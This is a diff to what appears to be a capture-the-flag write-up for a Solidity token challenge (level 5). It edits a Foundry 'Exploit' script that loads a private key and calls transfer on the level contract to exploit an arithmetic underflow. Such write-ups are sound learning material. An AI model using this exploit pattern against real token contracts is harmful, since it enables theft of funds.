@@ -103,17 +103,16 @@ function transfer(address _to, uint _value) public returns (bool) {
 contract Exploit is Script {
 
         Token level = Token(instance); 
-        address instance = vm.envAddress("INSTANCE_LEVEL5");
-        uint256 hacker = vm.envUint("PRIVATE_KEY");   
-        address deployer = vm.rememberKey(hacker);         
+        address instance = vm.envAddress("INSTANCE_LEVEL5");   
+        address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));        
         
         function run() external {
-
-            vm.startBroadcast(deployer);
+            vm.startBroadcast(hacker);
             level.transfer(address(0), 21);
             vm.stopBroadcast();
     }
 }
+
 ```
 
 <br>
